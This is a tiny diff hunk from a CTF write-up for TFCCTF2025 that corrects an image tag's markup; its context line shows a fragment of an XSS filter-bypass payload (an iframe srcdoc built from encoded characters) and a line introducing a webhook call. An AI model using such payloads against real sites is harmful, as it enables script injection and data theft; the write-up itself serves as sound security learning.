@@ -139,7 +139,7 @@ ${banned[1]}iframe Srcdoc='${banned[0]}#x3c${banned[0]}#x69${banned[0]}#x6d${ban
 ```
 <br />
 
-<img/src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/4.png">
+<img src="https://github.com/Yazan03/CTF-writeups2025/blob/main/TFCCTF2025/images/4.png">
 
 <br />
 Let's try call our webhook:
